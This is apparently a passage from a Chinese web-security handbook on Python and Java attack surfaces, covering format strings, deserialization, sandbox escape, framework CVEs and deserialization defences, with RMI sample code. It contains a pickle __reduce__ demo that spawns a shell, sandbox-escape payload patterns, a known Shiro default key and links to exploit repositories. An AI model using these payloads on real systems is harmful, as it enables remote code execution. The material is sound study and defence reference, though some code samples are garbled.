-   [PHP7 内核剖析](https://github.com/pangudashu/php7-internal)

#### Blog

-   [How we broke PHP](https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/)

## 5.2 Python

### 格式化字符串

> 在 Python 中，有两种格式化字符串的方式，在 Python2 的较低版本中，格式化字符串的方式为 \"this is a %s\" % \"test\" ，之后增加了 format 的方式，语法为 \"this is a {}\".format(\'test\') 或者 \"this is a {test}\".format(test=\'test\')
>
> 当格式化字符串由用户输入时，则可能会造成一些问题，下面是一个最简单的例子
>
> ```powershell
> >>>'class of {0} is {0.__class__}'.format(42)
> "class of 42 is <class'int'>"
> ```
>
> 从上面这个简单的例子不难知道， 当我们可以控制要 format 的字符串时， 则可以使用 \_\_init\_\_ /_\_globals__ 等属性读取一些比较敏感的值，甚至任意执行代码。
>

### 反序列化

#### pickle demo

Python Pickle 在反序列化时会调用 \_\_reduce__ ，可用自定义的 _\_reduce__ 函数来实现攻击。

```python
import pickle
import pickletools
import subprocess

class A(object):
    a=1
    b=2
    def __reduce__(self):
        return(subprocess.Popen,(('cmd.exe',),))
    
data=pickle.dumps(A())
pickletools.dis(data)
```

#### 其他序列化库

-   PyYAML

-   marshal

-   shelve

### 沙箱

#### 常用函数

-   eval / exec / compile

-   dir / type

-   globals / locals / vars

-   getattr / setattr

#### 导入包方式

-   import os

-   from os import \*

-   _\_import__ (\"os\")

-   importlib

-   imp

-   reload(os)

-   execfile 仅 Python2 支持

#### 绕过

-   dir( _\_builtins__ ) 查看内置模块

-   最简单的思路是在已有的模块中 import，如果那个模块中已经 import 可以利用的模块就可以使用了

- ```
  在父类中寻找可用的模块，最常见 payload 是 (). __class__ . __bases__[0]. __subclasses__() 
  或者用魔术方法获取全局作用域 __init__ . __func__ . __globals__
  ```

-   有些网站没有过滤 pickle 模块，可以使用 pickle 实现任意代码执行，生成 payload 可以使用 https://gist.github.com/freddyb/3360650

-   有的沙箱把相关的模块代码都被删除了，则可以使用 libc 中的函数，Python 中调用一般可以使用ctypes 或者 cffi。

-   \"A\"\"B\" == \"AB\"

#### 防御

Python 官方给出了一些防御的建议

-   使用 Jython 并尝试使用 Java 平台来锁定程序的权限

-   使用 fakeroot 来避免

-   使用一些 rootjail 的技术

### 框架

#### Django

##### 历史漏洞

-   [CVE-2016-7401 CSRF Bypass](https://paper.seebug.org/58/)

-   [CVE-2017-7233/7234 Open redirect vulnerability](https://www.djangoproject.com/weblog/2017/apr/04/security-releases/)

-   [CVE-2017-12794 debug page XSS](https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html)

##### 配置相关

-   Nginx 在为 Django 做反向代理时，静态文件目录配置错误会导致源码泄露。访问 /static.. 会 301 重定向到 /static../

#### Flask

Flask 默认使用客户端 session，使得 session 可以被伪造

### 代码混淆

#### 常见混淆方式

-   基于 AST 变换

-   编译为 pyc 文件

-   Pyinstaller

-   PyArmor

-   通过 AES 加密为 pye 文件

### Sink

#### 命令执行

-   asyncio.new_event_loop().subprocess_exec

-   asyncio.subprocess

-   bdb.os

-   cgi.os.system

-   cgi.sys

-   code.InteractiveInterpreter

-   commands

-   ctypes.CDLL

-   eval

-   exec

-   execfile

-   input // python2 only

-   os.exec

-   os.exec\*

-   os.fork

-   os.popen

-   os.spawn

-   os.system

-   platform.os

-   platform.popen

-   platform.sys

-   popen2

-   pty.os

-   pty.spawn

-   subprocess

-   timeit.sys

-   timeit.timeit

-   typing.get_type_hints() + _\_annotations__

-   \...

#### 文件读取

-   open

-   os.open

-   urllib.request.urlopen('file:///')

-   codecs.open

-   fileinput

-   ###### 仅 Python2

    -   types.FileType

#### 危险第三方库

-   Template

-   subprocess32

#### 反序列化

-   marshal

-   PyYAML

-   pickle

-   cPickle

-   shelve

-   PIL

### 参考链接

#### 反序列化

-   [Python pickle 反序列化](http://www.91ri.org/9576.html)

-   [Python 沙箱官方 wiki](https://wiki.python.org/moin/SandboxedPython)

-   [Python eval 的常见错误封装及利用原理](http://xxlegend.com/2015/07/31/Python%20evalçš„å¸¸è§é”™è¯¯å°è£…åŠåˆ©ç”¨åŽŸç†/)

-   [pickle Python 对象序列化](https://docs.python.org/zh-cn/3/library/pickle.html)

-   [Sour Pickles A serialised exploitation guide in one part](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)

-   [How pickle works in Python](https://rushter.com/blog/pickle-serialization-internals/)

#### 沙箱

-   [Python 沙箱通用绕过](https://www.anquanke.com/post/id/86366)

-   [一文看懂 Python 沙箱逃逸](https://www.freebuf.com/articles/system/203208.html)

#### 格式化字符串

-   [Python 字符串格式化漏洞](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html)

-   [Be Careful with Python's New-Style String Format](http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/)

#### 综合

-   [python security](https://github.com/vstinner/python-security.git)

-   [Python 安全和代码审计相关资料收集](https://github.com/bit4woo/python_sec)

## 5.3 Java

### 基本概念

#### JVM

> JVM 是 Java 平台的核心，以机器代码来实现，为程序执行提供了所需的所有基本功能，例如字节码解析器、JIT 编译器、垃圾收集器等。由于它是机器代码实现的，其同样受到二进制文件受到的攻击。
>
> JCL 是 JVM 自带的一个标准库，含有数百个系统类。默认情况下，所有系统类都是可信任的， 拥有所有的特权。

#### JDK

> Java 开发工具包 (Java Development Kit，JDK) 是 Oracle 公司发布的 Java 平台，有标准版 (Standard Edition，Java SE)、企业版 (Enterprise Edition，Java EE) 等版本。
>
> 在最开始，JDK 以二进制形式发布，而后在 2006 年 11 月 17 日，Sun 以 GPL 许可证发布了 Java 的源代码，于是之后出现了 OpenJDK。

#### JMX

> JMX(Java Management Extensions，Java 管理扩展) 是一个为应用程序植入管理功能的框架，主要为管理和监视应用程序、系统对象、设备和面向服务的网络提供相应的工具。JMX 可以远程读取系统中的值、调用系统中的方法。在 JMX 未配置身份验证或 JDK 版本过低存在反序列化漏洞时，可能会导致远程代码执行。

#### JNI

> JNI (Java Native Interface) 是 Java 提供的和其他语言交互的接口。

#### JNA

> JNA (Java Native Access) 是在 JNI 上的框架，用于自动实现 Java 接口到 native function 的映射，而不需要另外编写 JNI 代码。

#### OGNL

> OGNL(Object-Graph Navigation Language，对象导航语言) 是一种功能强大的表达式语言，通过简单一致的表达式语法，提供了存取对象的任意属性、调用对象的方法、遍历整个对象的结构图、实现字段类型转化等功能。
>
> Struts2 中使用了 OGNL，提供了一个 ValueStack 类。ValueStack 分为 root 和 context 两部分。root 中是当前的 action 对象，context 中是 ActionContext 里面所有的内容。

#### IO 模型

> Java 对操作系统的各种 IO 模型进行了封装，形成了不同的 API。

#### BIO

> BIO (Blocking I/O) 是同步阻塞 I/O 模式，数据的读取写入必须阻塞在一个线程内等待其完成。

#### NIO

> NIO (New I/O) 是一种同步非阻塞的 I/O 模型，在 Java 1.4 中引入，对应 java.nio 包，提供了 Channel , Selector，Buffer 等抽象。

#### AIO

> AIO (Asynchronous I/O) 在 Java 7 中引入，是 NIO 的改进版，是异步非阻塞的 IO 模型，基于事件和回调机制实现。

#### 反射

##### 简介

> Java 反射机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能被称为语言的反射机制。
>

##### 相关类

| 类名        | 用途         |
| ----------- | ------------ |
| Class       | 类的实体     |
| Field       | 类的成员变量 |
| Method      | 类的方法     |
| Constructor | 类的构造方法 |

##### Class 相关

-   **asSubclass(Class\<U\> clazz)**

    -   把传递的类的对象转换成代表其子类的对象

-   #### Cast

    -   把对象转换成代表类或是接口的对象

-   #### getClassLoader()

    -   获得类的加载器

-   #### getClasses()

    -   返回一个数组，数组中包含该类中所有公共类和接口类的对象

-   #### getDeclaredClasses()

    -   返回一个数组，数组中包含该类中所有类和接口类的对象

-   #### forName(String className)

    -   根据类名返回类的对象

-   #### getName()

    -   获得类的完整路径名字

-   #### newInstance()

    -   创建类的实例

-   #### getPackage()

    -   获得类的包

-   #### getSimpleName()

    -   获得类的名字

-   #### getSuperclass()

    -   获得当前类继承的父类的名字

-   #### getInterfaces()

    -   获得当前类实现的类或是接口

-   #### getField(String name)

    -   获得某个公有的属性对象

-   #### getFields()

    -   获得所有公有的属性对象

-   #### getDeclaredField(String name)

    -   获得某个属性对象

-   #### getDeclaredFields()

    -   获得所有属性对象

-   #### getAnnotation(Class\<A\> annotationClass)

    -   返回该类中与参数类型匹配的公有注解对象

-   #### getAnnotations()

    -   返回该类所有的公有注解对象

-   #### getDeclaredAnnotation(Class\<A\> annotationClass)

    -   返回该类中与参数类型匹配的所有注解对象

-   #### getDeclaredAnnotations()

    -   返回该类所有的注解对象

-   #### getConstructor(Class\...\<?\> parameterTypes)

    -   获得该类中与参数类型匹配的公有构造方法

-   #### getConstructors()

    -   获得该类的所有公有构造方法

-   #### getDeclaredConstructor(Class\...\<?\> parameterTypes)

    -   获得该类中与参数类型匹配的构造方法

-   #### getDeclaredConstructors()

    -   获得该类所有构造方法

-   #### getMethod(String name, Class\...\<?\> parameterTypes)

    -   获得该类某个公有的方法

-   #### getMethods()

    -   获得该类所有公有的方法

-   #### getDeclaredMethod(String name, Class\...\<?\> parameterTypes)

    -   获得该类某个方法

-   #### getDeclaredMethods()

    -   获得该类所有方法

-   #### isAnnotation()

    -   如果是注解类型则返回 true

-   #### isAnnotationPresent(Class\<? extends Annotation\> annotationClass)

    -   如果是指定类型注解类型则返回 true

-   #### isAnonymousClass()

    -   如果是匿名类则返回 true

-   #### isArray()

    -   如果是一个数组类则返回 true

-   #### isEnum()

    -   如果是枚举类则返回 true

-   #### isInstance(Object obj)

    -   如果 obj 是该类的实例则返回 true

-   #### isInterface()

    -   如果是接口类则返回 true

-   #### isLocalClass()

    -   如果是局部类则返回 true

-   #### isMemberClass()

    -   如果是内部类则返回 true

#### Field 相关

-   **equals(Object obj)**

    -   属性与 obj 相等则返回 true

-   #### get(Object obj)

    -   获得 obj 中对应的属性值

-   #### set(Object obj, Object value)

    -   设置 obj 中对应属性值

#### Method 相关

-   **invoke(Object obj, Object\... args)**

    -   传递 object 对象及参数调用该对象对应的方法

#### Constructor

-   **newInstance(Object\... initargs)**

    -   根据传递的参数创建类的对象


### 类

#### 生命周期

整体来说，Java 中类的生命周期如下：加载 (Loading) -\> \[ 连接 (Linking) : 验证 (Verification) -\> 准备(Perparation) -\> 解析 (Resolutin) \] -\> 初始化 (Initialization) -\> 使用 (Using) -\> 卸载 (Unloading) 。加载过程分为三步：

-   通过全限定类名来获取定义此类的二进制字节流
-   将字节流所代表的静态存储结构转化为方法区的运行时数据结构
-   在内存中生成代表这个类的 java.lang.Class 对象，作为方法区这个类的各种数据的访问入口

验证阶段主要用于确保 Class 文件的字节流符合当前虚拟机的要求，分为几步：

-   判断文件格式：是否以 0xCAFEBABE 开始，主次版本号是否在处理范围内
-   元数据验证
-   字节码验证
-   符号引用验证

### 部分运行选项与说明

-   -Xverify:none关闭类加载时的验证措施

### 框架

#### Servlet

##### 简介

Servlet(Server Applet) 是 Java Servlet 的简称，称为小服务程序或服务连接器，是用 Java 编写的服务器端程序，主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。

狭义的 Servlet 是指 Java 语言实现的一个接口，广义的 Servlet 是指任何实现了这个 Servlet 接口的类，一般情况下，人们将 Servlet 理解为后者。Servlet 运行于支持 Java 的应用服务器中。从原理上讲，Servlet 可以响应任何类型的请求，但绝大多数情况下 Servlet 只用来扩展基于 HTTP 协议的 Web 服务器。

##### 生命周期为

-   客户端请求该 Servlet

-   加载 Servlet 类到内存

-   实例化并调用 init() 方法初始化该 Servlet

-   service()(根据请求方法不同调用 doGet() / doPost() / \... / destroy()

##### 接口

init()

在 Servlet 的生命期中，仅执行一次 init() 方法，在服务器装入 Servlet 时执行。

service()

service() 方法是 Servlet 的核心。每当一个客户请求一个 HttpServlet 对象，该对象的 service() 方法就要被调用，而 传递给这个方法一个" 请求"(ServletRequest) 对象和一个" 响应"(ServletResponse) 对象作为参数。

#### Struts2

##### 简介

Struts2 是一个基于 MVC 设计模式的 Web 应用框架，它本质上相当于一个 servlet，在 MVC 设计模式中，Struts2 作为控制器 (Controller) 来建立模型与视图的数据交互。

##### 请求流程

-   客户端发送请求的 tomcat 服务器

-   请求经过一系列过滤器

-   FilterDispatcher 调用 ActionMapper 来决定这个请求是否要调用某个 Action

-   ActionMppaer 决定调用某个 ActionFilterDispatcher 把请求给 ActionProxy

-   ActionProxy 通过 Configuration Manager 查看 structs.xml，找到对应的 Action 类

-   ActionProxy 创建一个 ActionInvocation 对象

-   ActionInvocation 对象回调 Action 的 execute 方法

-   Action 执行完毕后，ActionInvocation 根据返回的字符串，找到相应的 result，通过 HttpServletResponse 返回给服务器

##### 相关 CVE

-   CVE-2016-3081 (S2-032)

-   CVE-2016-3687 (S2-033)

-   CVE-2016-4438 (S2-037)

-   [CVE-2017-5638](https://github.com/immunio/apache-struts2-CVE-2017-5638)

-   CVE-2017-7672

-   CVE-2017-9787

-   CVE-2017-9793

-   CVE-2017-9804

-   [CVE-2017-9805](https://github.com/mazen160/struts-pwn_CVE-2017-9805)

-   [CVE-2017-12611](https://github.com/brianwrf/S2-053-CVE-2017-12611)

-   CVE-2017-15707

-   CVE-2018-1327

-   CVE-2018-11776

#### Spring

##### 简介

> Spring 一般指的是 Spring Framework，一个轻量级 Java 应用程序开源框架，提供了简易的开发方式。

##### Spring MVC

> Spring MVC 根据 Spring 的模式设计的 MVC 框架，主要用于开发 Web 应用，简化开发。

##### Spring Boot

> Spring 在推出之初方案较为繁琐，因此提供了 Spring Boot 作为自动化配置工具，降低项目搭建的复杂度。

##### 请求流程

-   用户发送请求给服务器

-   服务器收到请求，使用 DispatchServlet 处理

-   Dispatch 使用 HandleMapping 检查 url 是否有对应的 Controller，如果有，执行

-   如果 Controller 返回字符串，ViewResolver 将字符串转换成相应的视图对象

-   DispatchServlet 将视图对象中的数据，输出给服务器

-   服务器将数据输出给客户端

##### CVE 概览

-   **CVE-2018-1270**

    -   Spring Websocket 远程代码执行漏洞

    -   Spring Framework 5.0 - 5.0.5

    -   Spring Framework 4.3 - 4.3.15

-   **CVE-2018-1273**
    -   Spring Data 远程代码执行漏洞
    
    -   Spring Data Commons 1.13 - 1.13.10
    
    -   Spring Data Commons 2.0 - 2.0.5
    
    -   Spring Data REST 2.6 - 2.6.10
    
    -   Spring Data REST 3.0 - 3.0.5
    
-   **CVE-2017-8046**
    -   Spring Data REST 远程代码执行漏洞
    
-   **CVE-2017-4971**
-   Spring Web Flow 远程代码执行漏洞

#### Shiro

##### 简介

Apache Shiro 是一个功能强大 易于使用的 Java 安全框架，功能包括身份验证，授权，加密和会话管理。

##### CVE 概览

**CVE-2020-13933**

-   Apache Shiro \< 1.6.0

-   身份验证绕过漏洞

**CVE-2020-11989**
-   SHIRO-782

-   Apache Shiro \< 1.5.3

-   身份验证绕过漏洞

**CVE-2020-1957**
-   SHIRO-682

-   Apache Shiro \< 1.5.2

-   身份验证绕过漏洞

**CVE-2019-12422**
-   SHIRO-721

-   Apache Shiro \< 1.4.2

-   Padding Oracle Attack 远程代码执行漏洞

**CVE-2016-4437**
-   SHIRO-550

-   Apache Shiro \<= 1.2.4

-   反序列化远程代码执行漏洞

**CVE-2014-0074**

- SHIRO-460
- Apache Shiro \< 1.2.3
- 身份验证绕过漏洞

##### CVE-2020-13933

> Apache Shiro 1.6.0 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。

##### CVE-2020-11989

> Apache Shiro 1.5.3 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。此漏洞存在两种攻击方式。

##### CVE-2020-1957

> Apache Shiro 1.5.2 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。

##### CVE-2019-12422

> Apache Shiro 1.4.2 之前的版本默认使用 AES/CBC/PKCS5Padding 模式加密, 开启 RememberMe 功能的 Shiro组件将允许远程攻击者构造序列化数据，通过 Padding Oracle Attack 进行爆破，即使在秘钥未知的条件下，也可以在目标服务器上执行任意命令。

##### CVE-2016-4437

> Apache Shiro 1.2.5 之前的版本在 org.apache.shiro.mgt.AbstractRememberMeManager 中存在 AES 默认秘钥 kPH+bIxk5D2deZiIxcaaaA== ，开启 RememberMe 功能的 Shiro 组件将允许远程攻击者构造序列化数据，在目标服务器上执行任意命令。

### 容器

常见的 Java 服务器有 Tomcat、Weblogic、JBoss、GlassFish、Jetty、Resin、IBM Websphere 等，这里对部分框架做一个简单的说明。

#### Tomcat

Tomcat 是一个轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，用于开发和调试 JSP 程序。

在收到请求后，Tomcat 的处理流程如下：

-   客户端访问 Web 服务器，发送 HTTP 请求

-   Web 服务器接收到请求后，传递给 Servlet 容器

-   Servlet 容器加载 Servlet，产生 Servlet 实例后，向其传递表示请求和响应的对象

-   Servlet 实例使用请求对象得到客户端的请求信息，然后进行相应的处理

-   Servlet 实例将处理结果通过响应对象发送回客户端，容器负责确保响应正确送出，同时将控制返回给Web 服务器

Tomcat 服务器是由一系列可配置的组件构成的，其中核心组件是 Catalina Servlet 容器，它是所有其他Tomcat 组件的顶层容器。

##### 相关 CVE

-   **CVE-2020-1938**

    -   <https://www.freebuf.com/vuls/228108.html>

-   **CVE-2019-0232**
    -   远程代码执行
    
    -   <https://github.com/pyn3rd/CVE-2019-0232/>
    
-   **CVE-2017-12615**
    -   任意文件写入
    
    -   [https://mp.weixin.qq.com/s? biz=MzI1NDg4MTIxMw==&mid=2247483659&idx=1&](https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw%3D%3D&mid=2247483659&idx=1&sn=c23b3a3b3b43d70999bdbe644e79f7e5) [sn=c23b3a3b3b43d70999bdbe644e79f7e5](https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw%3D%3D&mid=2247483659&idx=1&sn=c23b3a3b3b43d70999bdbe644e79f7e5)
    
-   CVE-2013-2067

-   CVE-2012-4534

-   CVE-2012-4431

-   CVE-2012-3546

-   CVE-2012-3544

-   CVE-2012-2733

-   CVE-2011-3375

-   CVE-2011-3190

-   CVE-2008-2938

#### Weblogic

##### 简介

WebLogic 是美国 Oracle 公司出品的一个 Application Server，是一个基于 Java EE 架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。其将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

WebLogic 对业内多种标准的全面支持，包括 EJB、JSP、Servlet、JMS、JDBC 等。

##### 相关 CVE

-   **CVE-2019-2725**

    -   wls-wsat 反序列化远程代码执行

-   CVE-2019-2658

-   CVE-2019-2650

-   CVE-2019-2649

-   CVE-2019-2648

-   CVE-2019-2647

-   CVE-2019-2646

-   CVE-2019-2645

-   **CVE-2019-2618**
    -   <https://github.com/jas502n/cve-2019-2618/>
    
-   CVE-2019-2615

-   CVE-2019-2568

-   CVE-2018-3252

-   CVE-2018-3248

-   CVE-2018-3245

-   CVE-2018-3201

-   CVE-2018-3197

-   **CVE-2018-3191**
    -   <https://github.com/voidfyoo/CVE-2018-3191>
    
    -   <https://github.com/Libraggbond/CVE-2018-3191>
    
-   **CVE-2018-2894**
    -   任意文件上传
    
    -   <https://xz.aliyun.com/t/2458>
    
-   **CVE-2018-2893**
    -   反序列化
    
    -   <https://www.freebuf.com/vuls/178105.html>
    
-   **CVE-2018-2628**
    -   <https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA>
    
-   CVE-2018-1258

-   **CVE-2017-10271**
    -   XMLDecoder 反序列化漏洞
    
    -   [http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.](http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.freebuf.com%2Fvuls%2F160367.html) [freebuf.com%2Fvuls%2F160367.html](http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.freebuf.com%2Fvuls%2F160367.html)
    
-   CVE-2017-3248

-   CVE-2016-3510

-   **CVE-2015-4852**
-   <https://github.com/roo7break/serialator>

#### JBoss

##### 简介

JBoss 是一个基于 J2EE 的管理 EJB 的容器和服务器，但 JBoss 核心服务不包括支持 servlet/JSP 的 WEB容器，一般与 Tomcat 或 Jetty 绑定使用。

##### 相关 CVE

-   **CVE-2017-12149**
-   反序列化漏洞
    
-   访问 /invoker/readonly ，页面存在即有反序列化漏洞

#### Jetty

##### 简介

> Jetty 是一个开源的servlet容器。



### 沙箱

#### 简介

> Java实现了一套沙箱环境，使远程的非可信代码只能在受限的环境下执行。

#### 相关 CVE

-   CVE-2012-0507

-   CVE-2012-4681

-   CVE-2017-3272

-   CVE-2017-3289



### 反序列化

#### 简介

序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。一般用于远程调用、通过网络将对象传输至远程服务器、存储对象到数据库或本地等待重用等场景中。 Java 中的 ObjectOutputStream 类的 writeObject() 方法可以实现序列化，类 ObjectInputStream 类的 readObject() 方法用于反序列化。如果要实现类的反序列化，则是对其实现 Serializable 接口。

当远程服务接受不可信的数据并进行反序列化 当前环境中存在可利用的类时，就认为存在反序列化漏洞。

#### 序列数据结构

-   0xaced 魔术头 / STREAM_MAGIC

-   0x0005 版本号 / STREAM_VERSION / 参考 java.io.ObjectStreamConstants

-   0x73 对象类型标识

-   0x72 类描述符标识

#### 序列化流程

-   ObjectOutputStream 实例初始化时，将魔术头和版本号写入 bout (BlockDataOutputStream 类型) 中

-   **调用 ObjectOutputStream.writeObject() 开始写对象数据**
    -   ObjectStreamClass.lookup() 封装待序列化的类描述 (返回 ObjectStreamClass 类型) ，获取包括类名、自定义 serialVersionUID、可序列化字段 (返回 ObjectStreamField 类型) 和构造方法，以及 writeObject、readObject 方法等
    
    -   **writeOrdinaryObject() 写入对象数据**
    -   写入对象类型标识
        
    -   **writeClassDesc() 进入分支 writeNonProxyDesc() 写入类描述数据**
            -   写入类描述符标识
        
            -   写入类名
            
            -   写入 SUID (当 SUID 为空时，会进行计算并赋值)
            
            -   计算并写入序列化属性标志位
            
            -   写入字段信息数据
            
            -   写入 Block Data 结束标识
            
            -   写入父类描述数据
        
        -   **writeSerialData() 写入对象的序列化数据**
    -   若类自定义了 writeObject()，则调用该方法写对象，否则调用 defaultWriteFields()写入对象的字段数据 (若是非原始类型，则递归处理子对象)

#### 反序列化流程

-   ObjectInputStream 实例初始化时，读取魔术头和版本号进行校验

-   **调用 ObjectInputStream.readObject() 开始读对象数据**
    -   读取对象类型标识
    
    -   **readOrdinaryObject() 读取数据对象**
    -   **readClassDesc() 读取类描述数据**
            -   读取类描述符标识，进入分支 readNonProxyDesc()
        
            -   读取类名
            
            -   读取 SUID
            
            -   读取并分解序列化属性标志位
            
            -   读取字段信息数据
            
            -   resolveClass() 根据类名获取待反序列化的类的 Class 对象，如果获取失败，则抛出 ClassNotFoundException
            
            -   skipCustomData() 循环读取字节直到 Block Data 结束标识为止
            
            -   读取父类描述数据
            
            -   initNonProxy() 中判断对象与本地对象的 SUID 和类名 (不含包名) 是否相同，若不同，则抛出 InvalidClassException
        
        -   ObjectStreamClass.newInstance() 获取并调用离对象最近的非 Serializable 的父类的无参构造方法 (若不存在，则返回 null) 创建对象实例
    
        -   **readSerialData() 读取对象的序列化数据**
    -   若类自定义了 readObject()，则调用该方法读对象，否则调用 defaultRead- Fields() 读取并填充对象的字段数据

#### 漏洞利用

**存在危险的基础库**

-   com.mchange:c3p0 0.9.5.2

-   com.mchange:mchange-commons-java 0.2.11

-   commons-beanutils 1.9.2

-   commons-collections 3.1

-   commons-fileupload 1.3.1

-   commons-io 2.4

-   commons-logging 1.2

-   org.apache.commons:commons-collections 4.0

-   org.beanshell:bsh 2.0b5

-   org.codehaus.groovy:groovy 2.3.9

-   org.slf4j:slf4j-api 1.7.21

-   org.springframework:spring-aop 4.1.4.RELEASE

#### 回显方式

-   通过中间件特性回显

-   通过抛出异常回显

-   通过 OOB 回显

-   通过写静态文件回显

#### 漏洞修复和防护

**Hook resolveClass**

在使用 readObject() 反序列化时会调用 resolveClass 方法读取反序列化的类名，可以通过 hook 该方法来校验反序列化的类，一个 Demo 如下

```java
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException,ClassNotFoundException{
    if(!desc.getName().equals(SerialObject.class.getName())){
		throw new InvalidClassException( 									"Unauthorizeddeserializationattempt", desc.getName());
    }
    returnsuper.resolveClass(desc);
}
```

以上的 Demo 就只允许序列化 SerialObject ，通过这种方式，就可以设置允许序列化的白名单，来防止反序列化漏洞被利用。SerialKiller/Jackson/Weblogic 等都使用了这种方式来防御。

#### ValidatingObjectInputStream

Apache Commons IO Serialization 包中的 ValidatingObjectInputStream 类提供了 accept 方法，可以通过该方法来实现反序列化类白/黑名单控制，一个 demo 如下

```java
private static Object deserialize(byte[] buffer) throws IOException,ClassNotFoundException,ConfigurationException{
	Objectobj; 														ByteArrayInputStreambais=newByteArrayInputStream(buffer);
ValidatingObjectInputStreamois=newValidatingObjectInputStream(bais);
	ois.accept(SerialObject.class);
    obj=ois.readObject();
    return obj;
}
```

#### ObjectInputFilter(JEP290)

Java 9 提供了支持序列化数据过滤的新特性，可以继承 java.io.ObjectInputFilter 类重写 checkInput方法来实现自定义的过滤器，并使用 ObjectInputStream 对象的 setObjectInputFilter 设置过滤器来实现反序列化类白/黑名单控制。这个机制本身是针对 Java 9 的一个新特性，但是随后官方突然决定向下引进该增强机制，分别对 JDK 6,7,8 进行了支持。这个机制主要描述了如下的机制：

-   提供一个限制反序列化类的机制，白名单或者黑名单

-   限制反序列化的深度和复杂度

-   为 RMI 远程调用对象提供了一个验证类的机制

-   定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器



### RMI

#### 简介

RMI(Remote Method Invocation，远程方法调用) 能够让在客户端 Java 虚拟机上的对象像调用本地对象一样调用服务端 Java 虚拟机中的对象上的方法。其中 RMI 标准实现是 Java RMI，之外还有 Weblogic RMI、 Spring RMI 等不同的实现。

RMI 中比较重要的两个概念是 Stub 和 Skeleton，Stub 和 Skeleton 对同一套接口进行实现，其中 Stub 由 Client 端调用，并不进行真正的实现，而是和 Server 端通信。Skeleton 是 Server 端，监听来自 Stub 的连接，根据 Stub 发送的数据进行真正的操作。

#### 调用步骤

-   客户调用客户端辅助对象 Stub 上的方法

-   客户端辅助对象 Stub 打包调用信息 (变量，方法名)，通过网络发送给服务端辅助对象 Skeleton

-   服务端辅助对象 Skeleton 将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象

-   调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象 Skeleton

-   服务端辅助对象将结果打包，发送给客户端辅助对象 Stub

-   客户端辅助对象将返回值解包，返回给调用者

-   客户获得返回值

#### 样例

一份代码样例如下 (来自《Enterprise JavaBeans》)：

##### Person 接口定义

```java
public interface Person{ 
    public int getAge() throws Throwable;
    public String getName() throws Throwable;
}
```

##### 使用 PersonServer 实现 Person

```java
public class PersonServer implements Person{ 	
    private int age; 
    private String name;
    public PersonServer(Stringname,intage){
        this.age=age;
        this.name=name;
    }
    public int getAge(){
        returnage;
    }
    public String getName(){
        return name;
    }
}
```

##### 使用 Person_Stub 实现 Person

```java
import java.io.ObjectOutputStream; 
import java.io.ObjectInputStream;
import java.net.Socket;
public class Person_Stub implements Person{
    private Socket socket; 
    public Person_Stub() throws Throwable{ 
        //connect to skeleton 
        socket=newSocket("computer_name",9000);
    }
    public int getAge() throws Throwable{ 
        //pass method name to skeleton 
        ObjectOutputStream outStream= 										new ObjectOutputStream(socket.getOutputStream()); 			outStream.writeObject("age"); 
        outStream.flush(); 
        ObjectInputStream inStream=new 									ObjectInputStream(socket.getInputStream()); 
        return inStream.readInt();
    }
    public String getName()throwsThrowable{
        //pass method name to skeleton 
        ObjectOutputStream outStream= new 									ObjectOutputStream(socket.getOutputStream());
        outStream.writeObject("name"); 
        outStream.flush(); 
        ObjectInputStream inStream=new 										ObjectInputStream(socket.getInputStream()); 
        return (String)inStream.readObject();
    }
}
```

#### Skeleton 的实现

```java
import java.io.ObjectOutputStream; 
import java.io.ObjectInputStream; 
import java.net.Socket; 
import java.net.ServerSocket; 
public class Person_Skeleton extends Thread{ 
    private PersonServer myServer; 
    public Person_Skeleton(PersonServerserver){ 
        //get reference of object server 
        this.myServer=server;
    }
    publicvoidrun(){ 
        try{ 
            //new socket at port 9000 
            ServerSocket serverSocket=newServerSocket(9000); 
            //accept stub's request 
            Socketsocket=serverSocket.accept(); 
            while(socket!=null){ 
                //get stub's request 
                ObjectInputStream inStream= new 
                    ObjectInputStream(socket.getInputStream()); 
                String method= (String)inStream.readObject(); 
                //check method name
                if(method.equals("age")){ 
                    //execute object server's business method 
                    int age=myServer.getAge(); 
                    ObjectOutputStream outStream=new 								ObjectOutputStream(socket.getOutputStream()); 
                    //return result to stub 
                    outStream.writeInt(age); 
                    outStream.flush();
                }
                if(method.equals("name")){ 
                    //execute object server's business method 
                    String name=myServer.getName(); 
                    ObjectOutputStream outStream=new 								ObjectOutputStream(socket.getOutputStream());
                    //return result to stub 
                    outStream.writeObject(name); 
                    outStream.flush();
                }
            }
        }
        catch(Throwablet){ 
            t.printStackTrace(); 
            System.exit(0);
        }
    }
